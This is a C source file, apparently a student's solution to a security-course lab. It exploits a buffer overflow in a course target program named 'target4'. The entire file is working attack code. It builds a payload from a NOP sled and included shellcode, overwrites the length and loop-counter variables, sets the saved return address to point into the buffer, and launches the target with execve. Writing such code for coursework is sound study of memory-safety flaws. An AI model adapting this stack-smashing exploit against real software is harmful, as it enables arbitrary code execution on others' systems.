#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/* 
   &buf: 0x2021fdb0
   &len: 0x2021fe58
   &i: 0x2021fe5c
   
   rip: 0x2021fe68
   
   need to overwrite buf[184]

   
 */
int main(void)
{
  char *args[3];
  char *env[1];
  
  char ex_str[256];
  memset(ex_str, '\x90', 256);

  strcpy(ex_str, shellcode);
  ex_str[strlen(ex_str)] = '\x90'; // remove '\0' at the end of str
  
  // overwrite len
  strcpy(&ex_str[168], "\xff\x55\x55\x55");

  // overwrite i so that 16 char after 172 (to 188 is going to be overwrited)
  strcpy(&ex_str[172], "\xf0\x55\x55\x55");
  ex_str[strlen(ex_str)] = '\x90';
  
  // return addr
  strcpy(&ex_str[184], "\xb0\xfd\x21\x20");
  
  args[0] = TARGET; 
  args[1] = ex_str;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
